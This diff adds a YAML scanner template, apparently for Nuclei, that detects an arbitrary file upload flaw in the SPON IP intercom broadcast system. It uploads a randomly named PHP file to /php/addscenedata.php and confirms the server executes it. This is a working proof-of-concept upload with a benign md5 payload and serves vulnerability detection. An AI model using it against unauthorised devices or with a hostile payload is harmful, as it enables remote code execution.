@@ -1,0 +1,48 @@
+id: poc-yaml-spon-addscenedata-php-anyfile-upload
+info:
+  name: SPON IP Network Intercom Broadcast System Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/php/addscenedata.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b
+    body: |-
+      --b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b
+      Content-Disposition: form-data; name="upload"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});?>
+      --b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"res\":\"1\"}"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/images/scene/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
